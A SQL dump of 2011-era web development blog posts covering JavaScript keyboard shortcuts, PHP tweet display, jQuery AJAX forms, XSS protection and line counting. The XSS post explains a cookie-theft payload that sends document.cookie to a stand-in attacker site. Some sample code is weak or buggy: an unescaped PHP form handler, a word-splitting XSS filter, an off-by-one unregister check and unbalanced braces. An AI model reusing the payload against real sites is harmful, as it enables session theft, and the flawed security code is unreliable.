}\r\n        }\r\n    }\r\n\r\n    return index;\r\n},\r\n\r\nunregister: function(id_or_key, modifiers) {\r\n    var index = this.indexOf(id_or_key, modifiers);\r\n\r\n    if(index &gt; 0) {\r\n        this.registry.splice(index, 1);\r\n        return true;\r\n    } else {\r\n        return false;\r\n    }\r\n}\r\n</pre>\r\n<p>The indexOf() function looks through each definition in the registry and returns the index value if the definition was found, or -1 if it could not find the definition. The unregister() function uses the indexOf() function to unregister the keyboard shortcut definition if found (returns true), otherwise it returns false. With these two functions, a duplicate registration can now be prevented. Here\\''s a couple examples of how you could use both.</p>\r\n<pre class=\\"prettyprint\\">if(keyman.indexOf(\\''SaveSomething\\'') == -1) {\r\n    keyman.register(\\''SaveSomething\\'',\\''s\\'',function(event) {\r\n        alert(\\"We\\''re saving something!!\\");\r\n    }, \\''SHIFT\\'');\r\n}\r\n\r\nkeyman.unregister(\\''S\\'', \\''SHIFT\\'');\r\nkeyman.register(\\''SaveSomething\\'',\\''s\\'',function(event) {\r\n    alert(\\"We\\''re saving something again!!\\");\r\n}, \\''SHIFT\\'');\r\n</pre>\r\n<p>In the first example, we only register the \\''SaveSomething\\'' keyboard shortcut if doesn\\''t already exist in the registry. In the second example, we\\''re unregistering any definition that has the \\"SHIFT+S\\" key combination defined. Both examples prevent a duplicate registration which you may find useful in applications where users can define their own keyboard shortcuts (you wouldn\\''t want user shortcuts overriding system shortcuts, would you?).</p>\r\n<h2>Our Updated Keyman Object Looks Like This</h2>\r\n<pre class=\\"prettyprint\\">var keyman = {\r\n    code_registry: [],\r\n    key_registry: [],\r\n    registry: [], //an array that holds all of our registry entries\r\n\r\n    add: function(e) {\r\n        //key code (i.e. if \\"a\\" is pressed, then this function returns \\"65\\")\r\n        var code = this.getCode(e); \r\n\r\n        //key value (i.e. if \\"a\\" is pressed, then this function returns \\"A\\")\r\n        var key = this.getKey(e).toUpperCase(); \r\n\r\n        //if the key code and value aren\\''t already in the arrays, then add them!\r\n        if(!this.code_registry.inArray(code) &amp;&amp; !this.key_registry.inArray(key)) {\r\n            this.code_registry.push(code);\r\n            this.key_registry.push(key);\r\n        }\r\n\r\n        this.press(e);\r\n\r\n        return this;\r\n    },\r\n\r\n    getCode: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return code; \r\n    }, \r\n\r\n    getKey: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return String.fromCharCode(code); \r\n    },\r\n\r\n    getTarget: function(e) {\r\n        e = window.event || e;\r\n        var target = e.target || e.srcElement;\r\n        return target;\r\n    },\r\n\r\n    indexOf: function(id_or_key, modifiers) {\r\n        id_or_key = id_or_key.toUpperCase(); //all keys are converted to UpperCase\r\n        var index = -1;\r\n    \r\n        for(i = 0; i &lt; this.registry.length; i++) {\r\n            if(this.registry[i][0] == id_or_key || this.registry[i][1] == id_or_key) {\r\n                if(modifiers) {\r\n                    if(this.registry[i][3].join(\\'',\\'') == modifiers) {\r\n                        index = i;\r\n                        break;\r\n                    }\r\n                } else {\r\n                    index = i;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n\r\n        return index;\r\n    },\r\n\r\n    press: function(e) {\r\n        var target = this.getTarget(e);\r\n\r\n        //check if any modifiers are currently pressed\r\n        var mods = [];\r\n        \r\n        if(e.shiftKey == 1) mods.push(\\''SHIFT\\'');\r\n        if(e.ctrlKey == 1) mods.push(\\''CTRL\\'');\r\n        if(e.altKey == 1) mods.push(\\''ALT\\'');\r\n\r\n        var tags = [\\''INPUT\\'',\\''SELECT\\'',\\''TEXTAREA\\''];\r\n\r\n        if(tags.inArray(target.tagName)) {\r\n            return this;   \r\n        }\r\n\r\n        //loop through registry to find a match for the current key presses\r\n        for(i = 0; i &lt; this.registry.length; i++) {\r\n            var r_id = this.registry[i][0];\r\n            var r_key = this.registry[i][1];\r\n            var r_keydown = this.registry[i][2];\r\n            var r_mods = this.registry[i][3];\r\n\r\n            var all_pressed = true;\r\n            var keys = []; //keys in this definition, helpful for removal later\r\n    \r\n            if(r_key.indexOf(\\''+\\'') != -1) {\r\n                keys = r_key.split(\\''+\\'');\r\n            \r\n                for(j = 0; j &lt; keys.length; j++) {\r\n                    if(!this.key_registry.inArray(keys[j]) &amp;&amp; !this.code_registry.inArray(parseInt(keys[j]))) {\r\n                       all_pressed = false;\r\n                    }\r\n                }\r\n            } else if(!this.key_registry.inArray(r_key) &amp;&amp; !this.code_registry.inArray(parseInt(r_key))) {\r\n                all_pressed = false;\r\n            } else {\r\n                keys.push(r_key);\r\n            }\r\n\r\n            if(all_pressed) {\r\n                //check modifiers if they were defined and are pressed\r\n                var mods_pressed = true;\r\n\r\n                if(r_mods &amp;&amp; r_mods.length &gt; 0) {\r\n                    for(j = 0; j &lt; r_mods.length; j++) {\r\n                        var mod = r_mods[j];\r\n\r\n                        if(!mods.inArray(mod)) {\r\n                            mods_pressed = false;\r\n                        }\r\n                    }\r\n                }\r\n\r\n                if(mods_pressed) {\r\n                    if(typeof r_keydown == \\''function\\'') {\r\n                        r_keydown(e);\r\n                    }\r\n\r\n                    //remove all the pressed keys from the registry\r\n                    for(j = 0; j &lt; keys.length; j++) {\r\n                        var index = this.key_registry.indexOf(keys[j]);\r\n                        this.key_registry.splice(index, 1); //remove key from registry\r\n                        this.code_registry.splice(index, 1); //remove code from registry\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        return this;\r\n    },\r\n\r\n    /**\r\n    * register - registers a combination of key presses that produce a keyboard shortcut\r\n    *    @param id - a unique identifier that describes the shortcut\r\n    *    @param key - a set of keys (i.e. a, b, c, etc); for multiple combos \r\n    *          separate keys with the + sign (i.e. j+k+l); can optionally use key code too \r\n    *          (i.e.  65 for \\''a\\'', etc)\r\n    *    @param keydown - a function that executes when this shortcut has all the keys \r\n    *          pressed down\r\n    *    @param mods - a comma separated list of modifiers (CTRL, SHIFT, and/or ALT | \r\n    *          i.e. CTRL,ALT)\r\n    */\r\n    register: function(id, key, keydown, mods) {\r\n        mods = (mods) ? mods.split(\\'',\\'') : null;\r\n        this.registry.push([id, key.toUpperCase(), keydown, mods]);\r\n        return this;\r\n    },\r\n\r\n    remove: function(e) {\r\n        var code = this.getCode(e);\r\n        var key = this.getKey(e).toUpperCase();\r\n    \r\n        var index1 = this.code_registry.indexOf(code);\r\n        this.code_registry.splice(index1, 1);\r\n    \r\n        var index2 = this.key_registry.indexOf(key);\r\n        this.key_registry.splice(index2, 1);\r\n    \r\n        return this;\r\n    },\r\n\r\n    unregister: function(id_or_key, modifiers) {\r\n        var index = this.indexOf(id_or_key, modifiers);\r\n\r\n        if(index &gt; 0) {\r\n            this.registry.splice(index, 1);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n};\r\n</pre>\r\n<p>To see the updated Keyman object, in action, check out the demonstration on <a class=\\"link\\" href=\\"../demos/Keyman3.html\\">How To Use Keyboard Shortcuts For Good and Not Evil</a>.</p>\r\n<h2>Common Problems For Using Keyboard Shortcuts In Your Web Application</h2>\r\n<p>The biggest problem you are likely to face is keyboard shortcuts that have already been reserved by the browser. Registering a keyboard shortcut that is already reserved by the browser could have unexpected results. My recommendation is to use a single key for the shortcut or use SHIFT + key. Of course you can still use CTRL or ALT, but make sure the shortcut you are registering isn\\''t already reserved by any of the more popular browsers.</p>\r\n<p>Another problem that might come up is when a field on a form has focus without the user knowing. Then when the user tries to activate a keyboard shortcut, nothing happens. To combat this, either allow the shortcut event to run by taking out the code that halts it, or alert the user of the field that currently has focus by highlighting it in some way.</p>\r\n<h2>Using Keyboard Shortcuts for Good and not Evil</h2>\r\n<p>Whatever you do, don\\''t detract from the user\\''s experience! Keyboard shortcuts are meant to enhance the experience, not to make it frustrating. Use keyboard shortcuts for good, not evil!</p>\r\n<h2>Questions? Comments? Suggestions?</h2>\r\n<p>Feel free to leave a comment, questions or suggestions in regards to implementing keyboard shortcuts in your web application. Happy coding!</p>\r\n<script type=\\"text/javascript\\">// <![CDATA[\r\nprettyPrint();\r\n// ]]></script>', '2011-05-23 12:25:26', '2011-05-25 13:03:09'),
(75, 'How To Display Your Latest Tweets with PHP', 'Learn how to display your latest tweets from Twitter in PHP', '<p>I recently wanted to display my latest tweets on my website since I am <em>trying</em>&nbsp;to use Twitter more regularly. &nbsp;Until I was able to do this, I knew nothing about Twitter or its API\\''s and I didn\\''t really feel like researching it much either. &nbsp;I wanted a quick solution and a simple google search lead me to Nick Heer\\''s blog post <a class=\\"link\\" href=\\"http://nickheer.com/blog/display-latest-tweet-with-php/\\" target=\\"_blank\\">Display Your Latest Tweet With PHP</a>. &nbsp;Nick cites that he pulled the code from <a class=\\"link\\" href=\\"http://www.smashingmagazine.com/2009/03/04/15-useful-twitter-plugins-and-hacks-for-wordpress/\\" target=\\"_blank\\">Smashing Magazine</a>, but Smashing Magazine actually got it from <a class=\\"link\\" href=\\"http://scriptplayground.com/tutorials/php/Latest-Twitter-Update-With-PHP/\\" target=\\"_blank\\">Ryan Barr at Script Playground</a>. &nbsp;Now that I\\''ve given credit where credit is due, I can tell you that Ryan Barr\\''s code actually only provides you with your last tweet. &nbsp;I wanted to display my last 5 tweets so I had to modify his code, but before we move onto this, here\\''s the updated code that we\\''ll be working from as modified by Nick Heer:</p>\r\n<pre class=\\"prettyprint\\">$username = \\"e_d_s_a_t_a\\";\r\n$feed = \\"http://search.twitter.com/search.atom?q=from:\\" . $username . \\"&amp;rpp=1\\";\r\n\r\nfunction parse_feed($feed) {\r\n    $stepOne = explode(\\"&lt;content type=\\\\\\"html\\\\\\"&gt;\\", $feed);\r\n    $stepTwo = explode(\\"&lt;/content&gt;\\", $stepOne[1]);\r\n    $tweet = $stepTwo[0];\r\n    $tweet = htmlspecialchars_decode($tweet, ENT_QUOTES);\r\n    return $tweet;\r\n}\r\n\r\n$twitterFeed = file_get_contents($feed);\r\necho(\\''\\"\\''.parse_feed($twitterFeed).\\''\\"\\'');\r\n</pre>\r\n<h2>What\\''s Going On In The Code Above?</h2>\r\n<p>The code above uses PHP\\''s <a class=\\"link\\" href=\\"http://php.net/manual/en/function.file-get-contents.php\\" target=\\"_blank\\">file_get_contents</a> function to grab an RSS ATOM feed for a particular username (in the code above: e_d_s_a_t_a) from search.twitter.com. It takes the HTML contents (placed in the $twitterFeed variable) and extracts the last tweet from the feed using the parse_feed function. Why only the last one? If you notice in the feed URL there is a parameter (rpp) set to 1. You can set that parameter to any number of tweets you want displayed.</p>\r\n<h2>Let\\''s Modify The Code To Display The Last 5 Tweets</h2>\r\n<p>If you were to look at the HTML contents of the twitter feed, you would understand better what the parse_feed function is doing in the code above. It is exploding the feed into parts and placing these parts into an array. It then takes the 2nd element (at position 1) and explodes it into parts. The first element in the resulting array is then the content of the tweet. Let\\''s modify the parse_feed function to return multiple tweets:</p>\r\n<pre class=\\"prettyprint\\">function parse_feed($feed) {\r\n    $tweets = array();\r\n    $data = explode(\\"&lt;content type=\\\\\\"html\\\\\\"&gt;\\", $feed);\r\n		\r\n    for($i = 1; $i &lt; count($data); $i++) {\r\n	$tweet = explode(\\"&lt;/content&gt;\\", $data[$i]);\r\n	array_push($tweets, htmlspecialchars_decode($tweet[0], ENT_QUOTES));\r\n    }\r\n    \r\n    return $tweets;\r\n}\r\n</pre>\r\n<p>We\\''re doing, almost, the same thing before, except we are looping through <em>all&nbsp;</em>the items in the first array and extracting the contents of each tweet. The contents of each tweet is placed in the $tweets array and returned. We can then output the resulting tweets any way we want, but before you do, make sure you modify the (rpp) parameter in the feed and set it to however many tweets you want to display (I\\''ve set mine to 5). Here\\''s the updated code:</p>\r\n<pre class=\\"prettyprint\\">function parse_feed($feed) {\r\n    $tweets = array();\r\n    $data = explode(\\"&lt;content type=\\\\\\"html\\\\\\"&gt;\\", $feed);\r\n		\r\n    for($i = 1; $i &lt; count($data); $i++) {\r\n	$tweet = explode(\\"&lt;/content&gt;\\", $data[$i]);\r\n	array_push($tweets, htmlspecialchars_decode($tweet[0], ENT_QUOTES));\r\n    }\r\n    \r\n    return $tweets;\r\n}\r\n\r\n$username = \\"e_d_s_a_t_a\\";\r\n$feed = \\"http://search.twitter.com/search.atom?q=from:\\" . $username . \\"&amp;rpp=5\\";\r\n		\r\n$twitterFeed = file_get_contents($feed);\r\n$tweets = parse_feed($twitterFeed);\r\n\r\nforeach($tweets as $tweet) {\r\n    echo \\"&lt;p&gt;$tweet&lt;/p&gt;\\";\r\n}\r\n</pre>\r\n<p>Now you too can display your most recent tweets on your site and use CSS to style them however you wish!</p>\r\n<script type="text/javascript">\r\nprettyPrint();\r\n</script>', '2011-05-19 13:37:44', '2011-05-23 16:33:49');
INSERT INTO `js_blog` (`id`, `title`, `description`, `content`, `created`, `modified`) VALUES
(77, 'How To Submit a Form with jQuery and AJAX', 'This article demonstrates on how to submit a form via jQuery and AJAX.', '<p>HTML forms make up a large part of the web. They are the primary method for retrieving input from users. &nbsp;Typically, you fill out the form, click the submit button, and be redirected to a thank you page. &nbsp;For web applications, this may not be ideal - you may not want the user to leave the page. In this article, I\\''ll show you how to use jQuery\\''s AJAX function to submit a form asynchronously to the server and avoid a redirect.</p>\r\n<h2>A Simple Contact Form</h2>\r\n<p>Here\\''s an example of a simple contact form (fyi: submitting it won\\''t do anything yet). We\\''ll be submitting this form via AJAX with jQuery.</p>\r\n<form id=\\"ContactForm\\">Your Name: <input type=\\"text\\" name=\\"name\\" value=\\"\\" /><br /> Your Email: <input type=\\"text\\" name=\\"email\\" value=\\"\\" /><br /> Your Message:<br /> <textarea style=\\"width: 200px; height: 100px;\\" name=\\"message\\"></textarea><br /><br /> <input type=\\"submit\\" name=\\"submit\\" value=\\"Submit\\" />\r\n<div class=\\"form_result\\">&nbsp;</div>\r\n</form>\r\n<p>Here\\''s the code for the form:</p>\r\n<pre class=\\"prettyprint\\">&lt;form id=\\"ContactForm\\"&gt;\r\n    Your Name: &lt;input type=\\"text\\" name=\\"name\\" value=\\"\\" /&gt;&lt;br /&gt; \r\n    Your Email: &lt;input type=\\"text\\" name=\\"email\\" value=\\"\\" /&gt;&lt;br /&gt; \r\n    Your Message:&lt;br /&gt; &lt;textarea style=\\"width: 200px; height: 100px;\\" name=\\"message\\"&gt;&lt;/textarea&gt; \r\n    &lt;br /&gt;&lt;br /&gt; \r\n    &lt;input type=\\"submit\\" name=\\"submit\\" value=\\"Submit\\" /&gt;&lt;br /&gt;\r\n    &lt;div class=\\"form_result\\"&gt;&nbsp;&lt;/div&gt;\r\n&lt;/form&gt;\r\n</pre>\r\n<p>Notice that I gave my form tag an ID of \\"ContactForm\\". We\\''ll need this later so that jQuery can find and retrieve all the data contained in the form. Additionally, I\\''ve included a div element to which we will dynamically update with the response from the server. &nbsp;The div has a class of \\''form_result\\'' that we can use to tell jQuery where the response from the server should be output to. &nbsp;The reason I\\''m using a class identifier here instead of giving the div an id attribute is because on very large forms, you may want the result of the form to be shown at the very top of the form as well as the bottom. &nbsp;With jQuery, we can select and update multiple elements with the same class. &nbsp;However, we can only update one element with the same id. &nbsp;</p>\r\n<h2>jQuery\\''s AJAX Function</h2>\r\n<p>The syntax for jQuery\\''s ajax function looks like this:</p>\r\n<pre class=\\"prettyprint\\">jQuery.ajax(url, [settings]);</pre>\r\n<p>A complete reference to this function can be found by clicking on this link:<a class=\\"link\\" href=\\"http://api.jquery.com/jQuery.ajax/\\" target=\\"_blank\\">jQuery\\''s AJAX function</a>.&nbsp;There are numerous settings available to use with this function, but we\\''re only going to be using a handful. We\\''ll discuss each setting briefly here:&nbsp;</p>\r\n<ul>\r\n<li><strong>url</strong>: set this to the URL the form will be submitted to (you\\''ll probably want to put in the URL to your form handler). We\\''ll be setting ours to jQuery-ajax-demo.php for demonstration purposes.</li>\r\n<li><strong>type</strong>: this is the method type for the form; set it to POST or GET. In our case, we\\''ll be using POST.</li>\r\n<li><strong>data</strong>: this is the data you\\''ll be submitting; it\\''s a standard query string that you typically see after a domain name in the browser\\''s address bar. You\\''ll see that for the most part, jQuery will create the query string for us.</li>\r\n<li><strong>success</strong>: you can set this to a single callback function, or as of jQuery 1.5 - an array of functions. We\\''ll be setting ours to a single callback function that accepts the response from the server (first parameter of the callback function).</li>\r\n</ul>\r\n<p>Let\\''s see what a call to jQuery\\''s AJAX function would look like for our demo:</p>\r\n<pre class=\\"prettyprint\\">$.ajax({type:\\''POST\\'', url: \\''jQuery-ajax-demo.php\\'', data:$(\\''#ContactForm\\'').serialize(), success: function(response) {\r\n    $(\\''#ContactForm\\'').find(\\''.form_result\\'').html(response);\r\n}});\r\n</pre>\r\n<p>As you can see, we are setting the \\''type\\'', \\''url\\'', \\''data\\'', and \\''success\\'' settings of jQuery\\''s AJAX function. In the \\''data\\'' setting, we\\''re using jQuery\\''s serialize() function by supplying the id of the form as the context.</p>\r\n<p>jQuery\\''s serialize() function looks at every field in the supplied context and creates a string of key-value pairs. The \\''name\\'' attribute of each of the fields in the form are used as the keys while the actual data contained in the fields become the values. So for example, in the form we created above, our query string (the result of the serialize function) might look like this:</p>\r\n<pre>name=Jason&amp;email=me%40example.com&amp;message=hey+what\\''s+up%3F</pre>\r\n<p>That\\''s if I submitted the form with Name set to \\"Jason\\", Email set to \\"me@example.com\\", and Message set to \\"hey what\\''s up?\\". The serialize() method also encodes the data so it can be easily transmitted to the server.&nbsp;</p>\r\n<p>We now have everything we need to submit the form to the server, but we do not have a form handler yet that will intercept the data and do something with it. &nbsp;</p>\r\n<h2>A Simple Form Handler in PHP</h2>\r\n<p>Doing anything too fancy is outside the scope of this article, so we\\''re just going to create a simple form handler that intercepts our data and outputs the data as the response. &nbsp;Take a look at this PHP code:</p>\r\n<pre class=\\"prettyprint\\">if(isset($_POST[\\''name\\''])) {\r\n    $name = $_POST[\\''name\\''];\r\n    $email = $_POST[\\''email\\''];\r\n    $msg = $_POST[\\''message\\''];\r\n	\r\n    ?&gt;\r\n    Your Name Is: &lt;?php echo $name; ?&gt;&lt;br /&gt;\r\n    Your Email Is: &lt;?php echo $email; ?&gt;&lt;br /&gt;\r\n    Your Message Is: &lt;?php echo $msg; ?&gt;&lt;br /&gt;\r\n    &lt;?php\r\n    die();\r\n}\r\n</pre>\r\n<p>Here we are first checking to see if the form was submitted. The result of isset($_POST[\\''name\\'']) will be true if the key \\''name\\'' is defined in PHP\\''s $_POST array, and false otherwise. It will be since \\''name\\'' is one of the fields on the form that is serialized and submitted via the AJAX request. Next, we retrieve and then output the data from each of the fields: name, email and message. I told you it was simple! In reality though, you\\''d probably want to validate the data. Although validating data from a form submission is outside the scope of this article, it does give me an idea for an article I could write next!</p>\r\n<h2>Putting It All Together</h2>\r\n<p>We have everything we need now, we just have to put it all together! The first thing we will do is create a JavaScript function we can call that runs our jQuery AJAX code, here\\''s what that looks like:</p>\r\n<pre class=\\"prettyprint\\">function submitForm() {\r\n    $.ajax({type:\\''POST\\'', url: \\''jQuery-ajax-demo.php\\'', data:$(\\''#ContactForm\\'').serialize(), success: function(response) {\r\n        $(\\''#ContactForm\\'').find(\\''.form_result\\'').html(response);\r\n    }});\r\n\r\n    return false;\r\n}\r\n</pre>\r\n<p>You can see we return false from the function. This is very important! When we return false from this function, it will stop the browser from submitting the form and reloading the page or redirecting us. The last we have to do is update the code for our form to call our submitForm() function:</p>\r\n<pre class=\\"prettyprint\\">&lt;form id=\\"ContactForm\\" onsubmit=\\"return submitForm();\\"&gt;\r\n    Your Name: &lt;input type=\\"text\\" name=\\"name\\" value=\\"\\" /&gt;&lt;br /&gt; \r\n    Your Email: &lt;input type=\\"text\\" name=\\"email\\" value=\\"\\" /&gt;&lt;br /&gt; \r\n    Your Message:&lt;br /&gt; &lt;textarea style=\\"width: 200px; height: 100px;\\" name=\\"message\\"&gt;&lt;/textarea&gt; \r\n    &lt;br /&gt;&lt;br /&gt; \r\n    &lt;input type=\\"submit\\" name=\\"submit\\" value=\\"Submit\\" /&gt;&lt;br /&gt;\r\n    &lt;div class=\\"form_result\\"&gt;&nbsp;&lt;/div&gt;\r\n&lt;/form&gt;\r\n</pre>\r\n<p>Check out the demonstration by clicking on <a class=\\"link\\" href=\\"../demos/jquery-ajax-demo.php\\">Demonstration on How To Submit a Form with jQuery and AJAX</a>. &nbsp;</p>\r\n<script type=\\"text/javascript\\">// <![CDATA[\r\nprettyPrint();\r\n// ]]></script>', '2011-06-01 13:29:05', '2012-02-01 19:36:57'),
(78, 'How To Protect Your Site From XSS With PHP', 'Details how to protect your site from cross-site scripting attacks with php and provides a useful php function with examples.', '<p>Cross-Site Scripting (XSS) is a type of attack where a hacker attempts to inject client-side scripting into a webpage that others are able to view. &nbsp;The attack could be as simple as an annoying alert window or as sophisticated as stealing a logged in user\\''s credentials (commonly saved in browser cookies). &nbsp;With a user\\''s credentials, a hacker could gain access to sensitive parts of your website or web application. &nbsp;In this simple guide, I\\''ll show you a few ways to protect your website from XSS with PHP.</p>\r\n<h2>The Basics Of An XSS Attack with Example</h2>\r\n<p>If you allow user input on your site or application (like comments, forums, etc), you could be the target of an XSS attack. &nbsp;The hacker\\''s goal is to submit a comment, forum post, etc with JavaScript code inside and have it executed on the web page. Since these types of user input can immediately be displayed to other user\\''s, the attack could be spread pretty quickly and even without your knowledge. &nbsp;For an example, we\\''ll use comments on my website:</p>\r\n<p><em>Let\\''s say some hacker comes along (his name is John) and submits a comment with &lt;script&gt;alert(\\''XSS!\\'');&lt;/script&gt; in the body of the comment. &nbsp;When John refreshes the page, he sees an alert message pop up that says \\"XSS!\\". &nbsp;His attack worked!</em></p>\r\n<p>All John does in this example is create an annoyance to users; he doesn\\''t actually steal any information. &nbsp;However, since that attack went through so easily, John may be thinking of other things he could do like stealing cookies! &nbsp;In JavaScript, cookies are accessible from the document object (i.e. document.cookie). &nbsp;John could easily send any cookies, of users that visit the page his comment is posted on, to his website by posting the following in the body of the comment form:</p>\r\n<pre class=\\"prettyprint\\">&lt;script&gt;document.write(\\"&lt;img src=\\''http://johns-site.com/?cookies=\\''\\"+document.cookie+\\"\\'' style=\\''display:none;\\'' /&gt;\\");&lt;/script&gt;</pre>\r\n<p>Why does that work? When your browser visits a webpage, it downloads any images. &nbsp;If the SRC attribute of an image points to something like the above, your browser will execute it. &nbsp;If John receives cookies that are used to validate a user login, he could use those cookies to gain access to, perhaps, an administrative control panel and do even more damage! Also notice that he set the display property of that element to \\"none\\", this makes it so users can\\''t see the image. &nbsp;John could post a valid comment about the article and execute that script without anyone knowing what he\\''s doing! &nbsp;The rule of thumb here is to NEVER TRUST USER INPUT!</p>\r\n<h2>How To Filter Out XSS Using PHP</h2>\r\n<p>PHP has a couple different functions you can use to filter user input, namely: htmlentities() and strip_tags().&nbsp;</p>\r\n<p>The htmlentities() function translates all applicable characters to their html entity counterparts. &nbsp;For example, using this function &lt; would become &amp;lt; and &gt; would become &amp;gt; (i.e. &lt;script&gt; would become &amp;lt;script&amp;gt;). This function is good for escaping data and might prevent some types of attack, but not all (thanks to IE6). &nbsp;When using the htmlentities function, make sure the second argument is set to ENT_QUOTES, like this:</p>\r\n<pre class=\\"prettyprint\\">htmlentities(\\"&lt;script&gt;alert(\\''XSS!\\'');&lt;/script&gt;\\", ENT_QUOTES);</pre>\r\n<p>You could use PHP\\''s strip_tags() function to remove any HTML tags, but even this still won\\''t prevent all types of XSS attacks (thanks to hyperlink vulnerabilities - a hacker doesn\\''t need to use the &lt;script&gt; tag in hyperlinks to get JavaScript to execute). &nbsp;So what can you do? You can use PHP to search for \\"script\\" and replace it with scri&lt;b&gt;&lt;/b&gt;pt. &nbsp;Cutting up the code like this will prevent it from executing while still displaying the output. &nbsp;</p>\r\n<h2>The XSS_PROTECT Function</h2>\r\n<p>Let\\''s create a PHP function that will filter out any data that may have XSS code inside of it:</p>\r\n<pre class=\\"prettyprint\\">/**\r\n* Method: xss_protect\r\n*    Purpose: Attempts to filter out code used for cross-site scripting attacks\r\n*    @param $data - the string of data to filter\r\n*    @param $strip_tags - true to use PHP\\''s strip_tags function for added security\r\n*    @param $allowed_tags - a list of tags that are allowed in the string of data\r\n*    @return a fully encoded, escaped and (optionally) stripped string of data\r\n*/\r\nfunction xss_protect($data, $strip_tags = false, $allowed_tags = \\"\\") { \r\n    if($strip_tags) {\r\n        $data = strip_tags($data, $allowed_tags . \\"&lt;b&gt;\\");\r\n    }\r\n\r\n    if(stripos($data, \\"script\\") !== false) { \r\n        $result = str_replace(\\"script\\",\\"scr&lt;b&gt;&lt;/b&gt;ipt\\", htmlentities($data, ENT_QUOTES)); \r\n    } else { \r\n        $result = htmlentities($data, ENT_QUOTES); \r\n    } \r\n\r\n    return $result;\r\n}\r\n</pre>\r\n<p>You can send this function any type of user input and it will return the same input, but fully escaped and encoded. &nbsp;This function first checks to see if the data contains the word \\"script\\" anywhere; if it doesn\\''t, it just encodes/escapes the data and returns it. &nbsp;If, however, the stripos function finds \\"script\\" somewhere, it encodes/escapes the data and replaces all findings of \\"script\\" with scr&lt;b&gt;&lt;/b&gt;ipt and then returns the modified result. &nbsp;</p>\r\n<p>There are a couple things to notice about this function; first, the stripos function is a way to check the existence of a substring within a string without regards to case (i.e. it will find \\"script\\", \\"sCrIpT\\" or \\"SCRIPT\\"); second, comparing the result of the stripos function to false with \\"!==\\", instead of \\"!=\\", is important since the stripos function can return a non-boolean value which evaluates to false (like 0 or \\"\\"). &nbsp;Using \\"!==\\" compares both the types and values while using \\"!=\\" compares just the values. &nbsp;See the PHP documentation on the <a class=\\"link\\" href=\\"http://php.net/manual/en/function.stripos.php\\" target=\\"_blank\\">stripos function</a> for more information.&nbsp;</p>\r\n<p>You can optionally specify whether you want the function to strip any HTML tags from the data string by setting the second parameter of the function to true. &nbsp;The third parameter can then be used to specify which HTML tags are allowed in the data string (which becomes the second argument to PHP\\''s strip_tags function).</p>\r\n<p>Here are a comple of examples on how to use this function:</p>\r\n<pre class=\\"prettyprint\\">//returns fully encoded/escaped content from comment\r\n$data = xss_protect($_POST[\\''comment_data\\'']); \r\n\r\n//outputs: &amp;lt;scr&lt;b&gt;&lt;/b&gt;ipt&amp;gt;alert(\\''XSS!\\'');&amp;lt;/scr&lt;b&gt;&lt;/b&gt;ipt&amp;gt;\r\necho xss_protect(\\"&lt;script&gt;alert(\\''XSS!\\'');&lt;/script&gt;\\"); \r\n\r\n//outputs: click here\r\necho xss_protect(\\"&lt;a href=\\"javascript:alert(document.cookie);\\"&gt;click here&lt;/a&gt;\\", true); \r\n</pre>\r\n<h2>Never Trust User Input</h2>\r\n<p>No solution is going to be perfect, but at least now you have a head start! &nbsp;If you have ways of improving this function, let myself and everyone else know in the comments. &nbsp;Thanks for reading!</p>\r\n<script type=\\"text/javascript\\">// <![CDATA[\r\nprettyPrint();\r\n// ]]></script>', '2011-06-08 07:55:22', '2011-06-08 12:53:20'),
(79, 'Count the Lines of Code in your Web Application with PHP', 'A PHP function to count the number of lines of code in a directory', '<p>Have you ever wanted to know how many lines of code your web application consists of? I have. &nbsp;To find out, I created a recursive function in PHP to count the number of lines in files relating to my web application. &nbsp;Since your entire web application is likely to reside under one directory (that\\''s the assumption I use in this article), we can count the number of lines in each file, and disinclude any files that don\\''t have the file extensions we\\''re looking for. &nbsp;For example, the system that powers my website is built with PHP, HTML, JavaScript, and CSS so I\\''m only going to be counting the lines in files that match these extensions: .php, .html, .js, and .css. &nbsp;Easy! &nbsp;Let\\''s get started...</p>\r\n<h2>Step 1: Creating the readDirectories() Function</h2>\r\n<p>Since it is likely that you have multiple files in multiple directories, we need a function to read in a listing of directories contained in our root directory so that we can read the files in each of those directories (and their sub-directories) as well.</p>\r\n<pre class=\\"prettyprint\\">/**\r\n* Method: readDirectories\r\n*	Purpose: Recursively read directories\r\n*	@param $root - the Root Directory Path\r\n*	@param $array - an array containing the currently read directories\r\n*/\r\nfunction readDirectories($root, $array = array()) {\r\n    if(is_dir($root)) {\r\n        if($handle = opendir($root)) {\r\n            while(false !== ($file = readdir($handle))) {\r\n                if($file == \\".\\" || $file == \\"..\\") continue;\r\n                    if(is_dir($root . \\"/\\" . $file)) {\r\n                        array_push($array, $root . \\"/\\" . $file);\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n	\r\n    return $array;\r\n}\r\n</pre>\r\n<p>This function takes two arguments: $root and $array. &nbsp;It returns the $array variable containing whatever is currently inside it along with all the names of the directories specified in $root. &nbsp;Pretty simple, but we also need to read all the files contained in each directory.</p>\r\n<h2>Step 2: Creating the readFiles() Function</h2>\r\n<p>As you can see below, the readFiles() function takes in two arguments: $root (the directory path to read files from) and $array. &nbsp;The function returns $array containing whatever it had in it before plus all the files it discovered when reading the directory path specified in $root.</p>\r\n<pre class=\\"prettyprint\\">/**\r\n* Method: readFiles\r\n*	Purpose: Recursively read files in a directory\r\n*	@param $root - the Root Directory Path\r\n*	@param $array - an array containing the currently read files\r\n*/\r\nfunction readFiles($root, $array = array()) {\r\n    if(is_dir($root)) {\r\n        if($handle = opendir($root)) {\r\n            while(false !== ($file = readdir($handle))) {\r\n                if($file == \\".\\" || $file == \\"..\\") continue;\r\n\r\n                if(!is_dir($root . \\"/\\" . $file)) {\r\n                    array_push($array, $root . \\"/\\" . $file);\r\n                }\r\n            }\r\n        }\r\n    }\r\n	\r\n    return $array;\r\n}\r\n</pre>\r\n<p>Now that we\\''ve built the pre-requisite functions for reading directories and files, we can finally get to the real meat of the article which is counting the lines in our web application!</p>\r\n<h2>Step 3: Creating the countLinesInDir() Function</h2>\r\n<pre class=\\"prettyprint\\">/**\r\n* Method: countLinesInDir\r\n*	Purpose: Counts lines in files in specified directory and sub-directory\r\n*	@param dir - the initial directory to look in\r\n*	@param file_exts - an array of file extensions to filter with and count lines in\r\n*	@param ex_dirs - an array of directories that should not be included in the count\r\n*/ 